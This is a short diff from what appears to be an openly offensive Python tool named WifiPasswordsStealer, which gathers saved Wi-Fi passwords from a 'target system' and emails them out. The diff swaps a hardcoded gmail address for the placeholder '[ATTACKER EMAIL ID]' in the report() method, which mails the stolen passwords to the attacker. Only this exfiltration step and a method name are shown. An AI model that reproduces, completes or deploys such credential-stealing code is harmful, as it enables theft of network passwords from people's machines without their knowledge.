@@ -11,7 +11,7 @@ class WifiPasswordsStealer:
         self.mailer = send_mails.SendMails()
 
     def report(self, mail_body):
-        self.mailer.send_mail("hack3d.txt@gmail.com", "Saved Wifi Passwords in Target System", mail_body)
+        self.mailer.send_mail("[ATTACKER EMAIL ID]", "Saved Wifi Passwords in Target System", mail_body)
 
     def get_network_names_list(self):
         try:
